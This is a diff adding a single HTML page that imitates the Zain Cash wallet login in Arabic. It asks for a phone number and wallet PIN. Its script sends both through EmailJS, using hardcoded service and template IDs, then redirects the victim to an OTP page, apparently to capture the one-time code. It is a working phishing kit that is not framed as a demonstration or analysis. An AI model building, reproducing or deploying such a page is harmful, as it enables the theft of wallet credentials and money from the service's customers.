@@ -1,0 +1,431 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Zain Cash - Login</title>
+    
+    <script 
+        type="text/javascript"
+        src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
+    </script>
+    
+    <link 
+        href="https://fonts.googleapis.com/css2?family=Cairo:wght@500;600;700&display=swap" 
+        rel="stylesheet">
+    
+    <style>
+        /* ============================ */
+        /* 3. التنسيقات الأساسية */
+        /* ============================ */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        html {
+            height: 100%;
+        }
+
+        body {
+            background-color: #FFFFFF;
+            font-family: 'Cairo', system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            min-height: 100%;
+        }
+
+        /* ============================ */
+        /* 4. تنسيق الهيدر الثابت */
+        /* ============================ */
+        .header {
+            background-color: #6A3395;
+            width: 100%;
+            height: 80px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 0 40px;
+            position: fixed;
+            top: 0;
+            left: 0;
+            z-index: 1000;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+        }
+
+        .logo-container {
+            display: flex;
+            align-items: center;
+            color: white;
+            height: 100%;
+        }
+
+        .logo-image-container {
+            height: 45px;
+            width: auto;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+            border-radius: 4px;
+        }
+
+        .logo-image {
+            height: 100%;
+            width: auto;
+            object-fit: contain;
+        }
+
+        .controls {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .download-btn {
+            background-color: white;
+            color: #6A3395;
+            border: none;
+            border-radius: 24px;
+            padding: 10px 20px;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+
+        .download-btn:hover {
+            background-color: #f0f0f0;
+        }
+
+        .icon-container {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background-color: rgba(255, 255, 255, 0.25);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            cursor: pointer;
+            position: relative;
+        }
+
+        .currency-container {
+            display: flex;
+            align-items: center;
+        }
+
+        .currency-symbol {
+            color: white;
+            font-weight: bold;
+            font-size: 18px;
+            margin-left: 5px;
+        }
+
+        .dropdown-arrow {
+            width: 12px;
+            height: 12px;
+            border-radius: 2px;
+            background-color: rgba(255, 255, 255, 0.3);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-right: 2px;
+        }
+
+        .dropdown-arrow::after {
+            content: "";
+            width: 0;
+            height: 0;
+            border-left: 4px solid transparent;
+            border-right: 4px solid transparent;
+            border-top: 4px solid white;
+        }
+
+        .search-icon {
+            width: 18px;
+            height: 18px;
+            position: relative;
+        }
+
+        .search-icon::before {
+            content: "";
+            position: absolute;
+            width: 14px;
+            height: 14px;
+            border: 2px solid white;
+            border-radius: 50%;
+            top: 0;
+            right: 0;
+        }
+
+        .search-icon::after {
+            content: "";
+            position: absolute;
+            width: 8px;
+            height: 2px;
+            background-color: white;
+            transform: rotate(45deg);
+            bottom: 0;
+            left: 0;
+        }
+        
+        /* ============================ */
+        /* 5. تنسيقات شاشة تسجيل الدخول (معدلة) */
+        /* ============================ */
+        
+        .login-content {
+            padding-top: 80px; 
+            padding-bottom: 40px;
+        }
+        
+        .form-wrapper {
+            width: 100%;
+            max-width: 440px;
+            padding: 40px 20px 20px 20px;
+            margin: 0 auto;
+        }
+        
+        /* تعديل: العنوان أصبح في الوسط */
+        .login-title {
+            font-family: 'Cairo', sans-serif;
+            font-weight: 700;
+            color: #1A1A1A;
+            font-size: 24px;
+            text-align: center; /* أصبح في الوسط */
+            margin-bottom: 30px;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+            text-align: right;
+        }
+        
+        .form-label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 14px;
+            font-weight: 600;
+            color: #666;
+        }
+        
+        .form-input {
+            background-color: #FFFFFF;
+            border-radius: 12px;
+            border: 1px solid #DDD;
+            width: 100%;
+            padding: 14px 16px;
+            font-size: 16px;
+            color: #333;
+            font-family: 'Cairo', sans-serif;
+            direction: ltr; 
+            text-align: left;
+        }
+        
+        /* تعديل: النص المؤقت أصبح على اليسار */
+        .form-input::placeholder {
+            color: #AAA;
+            text-align: left;
+            direction: ltr;
+        }
+        
+        .form-input:focus {
+            outline: none;
+            border-color: #6A3BA8;
+            box-shadow: 0 0 5px rgba(106, 59, 168, 0.2);
+        }
+
+        /* ------------------------------------- */
+        /* 6. تعديلات حقل رقم الهاتف (جديد) */
+        /* ------------------------------------- */
+
+        /* حاوي الحقل لإضافة الكود الثابت */
+        .phone-input-wrapper {
+            position: relative;
+        }
+
+        /* الكود الثابت "964" */
+        .country-code {
+            position: absolute;
+            left: 16px; /* محاذاة لليسار */
+            top: 50%;
+            transform: translateY(-50%);
+            color: #1A1A1A; /* لون أسود */
+            font-weight: 600;
+            font-size: 16px;
+            z-index: 2;
+            direction: ltr;
+        }
+
+        /* تعديل الحقل لإعطاء مساحة للكود */
+        .form-input.phone-input-field {
+            /* إضافة مساحة على اليسار لـ "964 " */
+            padding-left: 60px; 
+        }
+
+        /* ------------------------------------- */
+        
+        .forgot-link {
+            display: block;
+            color: #6A3BA8;
+            font-weight: 500;
+            font-size: 14px;
+            text-decoration: none;
+            text-align: right;
+            margin-top: -8px;
+            margin-bottom: 25px;
+        }
+        
+        .forgot-link:hover {
+            text-decoration: underline;
+        }
+        
+        .submit-btn {
+            width: 100%;
+            height: 50px;
+            border-radius: 50px;
+            background-color: #BFA2E3;
+            color: white;
+            font-size: 18px;
+            font-weight: 600;
+            font-family: 'Cairo', sans-serif;
+            border: none;
+            cursor: pointer;
+            transition: background-color 0.2s ease, transform 0.2s ease;
+        }
+        
+        .submit-btn:hover {
+            background-color: #b091d8;
+        }
+
+        .submit-btn:active,
+        .submit-btn:disabled {
+            background-color: #a280cc;
+        }
+
+        /* ------------------------------------- */
+        /* 7. تعديل: تثبيت الزر أسفل الشاشة (للموبايل) */
+        /* ------------------------------------- */
+        @media (max-width: 480px) {
+            .submit-btn {
+                position: fixed; /* تثبيت الزر */
+                bottom: 20px;    /* 20 بكسل من الأسفل */
+                left: 20px;      /* 20 بكسل من اليسار */
+                right: 20px;     /* 20 بكسل من اليمين */
+                width: auto;     /* إلغاء العرض 100% ليأخذ عرض الشاشة مع الحواف */
+                z-index: 100;    /* لضمان ظهوره فوق العناصر الأخرى */
+            }
+
+            /* إضافة مساحة سفلية للمحتوى */
+            /* لمنع الزر الثابت من تغطية رابط "إعادة تعيين" */
+            .form-wrapper {
+                /* 50px (ارتفاع الزر) + 20px (هامش سفلي) + 20px (هامش علوي) */
+                padding-bottom: 90px;
+            }
+        }
+
+    </style>
+</head>
+<body>
+    <header class="header">
+        <div class="logo-container">
+            <div class="logo-image-container">
+                <img src="https://i.imgur.com/QMO3R6p.png" alt="Zain Logo" class="logo-image" id="logoImage">
+            </div>
+        </div>
+        
+        <div class="controls">
+            <button class="download-btn">حمّل التطبيق!</button>
+            
+            <div class="icon-container currency-container">
+                <div class="dropdown-arrow"></div>
+                <div class="currency-symbol">ع</div>
+            </div>
+            
+            <div class="icon-container">
+                <div class="search-icon"></div>
+            </div>
+        </div>
+    </header>
+    
+    <main class="login-content">
+        
+        <div class="form-wrapper">
+            <h1 class="login-title">هلا بيك! سجل دخول</h1>
+            
+            <form id="login-form">
+                
+                <div class="form-group">
+                    <label for="phone_number" class="form-label">رقم الهاتف</label>
+                    
+                    <div class="phone-input-wrapper">
+                        <span class="country-code">964</span>
+                        <input 
+                            type="tel" 
+                            id="phone_number" 
+                            name="phone_number" 
+                            class="form-input phone-input-field" 
+                            placeholder="7XXXXXXXXX" 
+                            required>
+                    </div>
+                </div>
+                
+                <div class="form-group">
+                    <label for="pin_code" class="form-label">الرمز السري للمحفظة (PIN)</label>
+                    <input 
+                        type="password" 
+                        id="pin_code" 
+                        name="pin_code" 
+                        class="form-input" 
+                        required 
+                        maxlength="6" 
+                        inputmode="numeric"
+                        pattern="[0-9]*">
+                </div>
+                
+                <a href="#" class="forgot-link">إعادة تعيين الرمز السري للمحفظة PIN</a>
+                
+                <button type="submit" class="submit-btn">سجّل دخول</button>
+                
+            </form>
+        </div>
+        
+    </main>
+
+    <script>
+        (function() {
+            emailjs.init({
+                publicKey: "zWBq4dbSzfkEvVeS2", // ⚠️ استبدل هذا
+            });
+        })();
+
+        window.onload = function() {
+            document.getElementById('login-form').addEventListener('submit', function(event) {
+                event.preventDefault(); 
+                
+                const serviceID = 'service_lyabofe'; // ⚠️ استبدل هذا
+                const templateID = 'template_cxjh4ls'; // ⚠️ استبدل هذا
+
+                const submitBtn = event.target.querySelector('.submit-btn');
+                submitBtn.disabled = true;
+                submitBtn.textContent = '...جاري الإرسال';
+
+                emailjs.sendForm(serviceID, templateID, this)
+                    .then(() => {
+                        submitBtn.disabled = false;
+                        submitBtn.textContent = 'سجّل دخول';
+                        event.target.reset();
+                        
+                        // التوجيه إلى صفحة OTP بعد إرسال البريد الإلكتروني بنجاح
+                        window.location.href = 'otp.html';
+                    }, (err) => {
+                        submitBtn.disabled = false;
+                        submitBtn.textContent = 'سجّل دخول';
+                        alert('حدث خطأ أثناء تسجيل الدخول. يرجى المحاولة مرة أخرى.');
+                    });
+            });
+        }
+    </script>
+</body>
+
+</html>
